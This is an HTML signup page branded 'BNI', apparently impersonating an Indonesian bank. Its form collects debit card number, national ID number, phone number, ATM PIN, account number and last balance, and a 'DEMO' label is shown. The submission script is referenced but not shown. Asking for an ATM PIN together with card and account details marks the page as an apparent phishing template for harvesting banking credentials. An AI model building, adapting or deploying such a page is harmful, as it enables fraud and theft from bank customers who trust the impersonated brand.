<html>
  <head>
    <title>BNI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/signup.css">
    <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
    <link rel="stylesheet" href="assets/lib/jquery-ui/jquery-ui.css">
    <script>
      const module = {};
    </script>
    <script src="assets/common/js/jquery.js"></script>
    <script type="module" src="assets/common/js/signup.js"></script>
    <script type="module" src="assets/lib/jquery-ui/jquery-ui.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; background-color: #ffffff;">
      <div style="width: 100%; display: flex; flex-direction: column;">
        <div class="ripple" style="width: 50px; height: 50px; display: flex; justify-content: center; align-items: center;" onclick="module.goBack()">
            <ion-icon name="arrow-back" style="color: #888888; font-size: 20px;"></ion-icon>
        </div>
        <div style="color: #000000; font-size: 20px; font-weight: bold; margin-left: 20px; margin-right: 20px; margin-top: 10px;">Masukkan Informasi Pendaftaran</div>
      </div>
      <div style="flex: 1; width: 100%; position: relative;">
        <div style="width: 100%; display: flex; flex-direction: column; align-items: center; overflow: scroll;">
          <img src="assets/common/img/card.jpg" width="100%" height="150px" style="object-fit: fill; margin-top: 20px;">
          <div style="width: calc(100% - 40px); margin-left: 20px; margin-right: 20px; margin-top: 20px; margin-bottom: 120px;">
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Nomor Kartu Debit</div>
              <input id="debit-number" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 2px; margin-top: -5px; font-weight: bold; color: #000000;" placeholder="Masukkan 16 digit kartu debit" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Nomor Tanda Penduduk</div>
              <input id="identity-number" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 2px; margin-top: -5px; font-weight: bold; color: #000000;" placeholder="Masukkan 16 digit nomor tanda penduduk" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Jenis Kelamin</div>
              <select id="gender" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 2px; margin-top: -5px; font-weight: bold; color: #000000;" placeholder="Pilih jenis kelamin" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                  <option>Pria</option>
                  <option>Wanita</option>
              </select>
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Nomor Handphone</div>
              <input id="phone" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; font-weight: bold; margin-left: margin-left: 2px;" placeholder="Masukkan nomor handphone" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">PIN ATM</div>
              <input id="pin" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; font-weight: bold; margin-left: 2px;" placeholder="Masukkan PIN ATM" type="number" maxlength="6" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f6f6f6; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Nomor Rekening</div>
              <input id="account" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; font-weight: bold; margin-left: 2px;" placeholder="Masukkan nomor rekening" type="number" maxlength="20" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 55px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; display: flex; flex-direction: column; align-items: flex-start; margin-top: 20px;">
              <div style="color: #888888; font-size: 10px; margin-left: 5px; margin-top: 7px;">Saldo Terakhir</div>
              <input id="balance" style="width: 100%; height: 100%; font-weight: bold; background-color: #00000000; outline: 0; border: 0; margin-left: 2px;" type="number" maxlength="20" placeholder="Masukkan saldo terakhir" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div class="ripple" style="width: calc(100% - 40px); margin-left: 20px; margin-right: 20px; margin-top: 30px; height: 50px; min-height: 50px; background-color: #017cfb; border-radius: 30px; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); display: flex; justify-content: center; align-items: center; color: #ffffff; font-size: 15px; font-weight: bold;" onclick="module.next()">
                Lanjutkan
            </div>
          </div>
        </div>
        <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; display: none; flex-direction: column; justify-content: center; align-items: center;">
            <div style="width: calc(100% - 40px); height: 200px; border-radius: 10px; background-color: #ffffff; display: flex; justify-content: center; align-items: center;">
                <span class="loader"></span>
            </div>
        </div>
      </div>
      <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px; color: #ffffff; font-size: 20px; font-weight: bold;">DEMO</div>
    </div>
  </body>
</html>
